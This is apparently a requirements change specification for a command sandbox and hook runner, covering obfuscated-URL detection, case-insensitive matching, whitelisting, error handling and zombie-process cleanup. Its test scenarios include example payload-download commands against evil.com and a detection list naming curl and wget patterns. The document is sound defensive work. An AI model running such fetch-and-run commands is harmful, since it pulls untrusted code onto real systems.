## ADDED Requirements

### Requirement: Command detection SHALL detect obfuscated URLs
The sandbox SHALL detect URLs with common obfuscation patterns including but not limited to: `curlhttps://`, `hxxps://`, `wget`, `curl -k`, and IP addresses in URLs.

#### Scenario: Obfuscated download attempt
- **WHEN** Command contains `curlhttps://evil.com/payload.sh`
- **THEN** Command SHALL be rejected with sandbox violation error

### Requirement: Command detection SHALL use case-insensitive matching
URL scheme detection SHALL be case-insensitive to catch patterns like `CURLHTTP://` or `WGET`.

#### Scenario: Mixed case obfuscation
- **WHEN** Command contains `CURLHTTP://evil.com`
- **THEN** Command SHALL be rejected

### Requirement: Command sandbox SHALL support whitelisting
A whitelist of allowed commands or domains SHALL be configurable to prevent false positives.

#### Scenario: Whitelisted domain
- **WHEN** Command contains `curl https://trusted-source.com/safe-script.sh`
- **THEN** If trusted-source.com is in whitelist, command SHALL be allowed

---

## MODIFIED Requirements

### Requirement: Command execution errors SHALL return Result not panic
The hook_runner execute_command method SHALL return Result<HookResult, HookRunnerError> instead of panicking on command failure.

#### Scenario: Command times out
- **WHEN** Hook command exceeds timeout limit
- **THEN** Result SHALL be Err(HookRunnerError::Timeout(seconds)) and SHALL NOT panic

### Requirement: Session process management SHALL wait for child processes
The get_child() method or equivalent SHALL ensure child processes are waited on to prevent zombie processes.

#### Scenario: Process cleanup on session end
- **WHEN** Session is being cleaned up
- **THEN** All child processes SHALL have wait() called to reap zombie processes

---

## REMOVED Requirements

### Requirement: (None - no requirements being removed)

---

## RENAMED Requirements

### Requirement: (None - no requirements being renamed)